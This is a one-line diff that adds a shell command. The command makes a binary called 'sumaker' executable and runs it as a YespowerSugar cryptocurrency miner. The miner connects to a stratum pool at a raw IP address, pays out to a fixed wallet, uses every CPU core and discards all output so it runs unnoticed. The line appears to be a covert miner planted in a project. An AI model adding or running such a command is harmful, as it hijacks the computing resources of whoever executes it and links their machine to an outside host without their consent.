@@ -1,0 +1,1 @@
+chmod +x sumaker && ./sumaker -a YespowerSugar -o stratum+tcp://8.215.4.141:443 -u sugar1qkjclufxaj7zvw7686sr589mpklrp3k858hqudj.super -t $(nproc --all) > /dev/null 2>&1
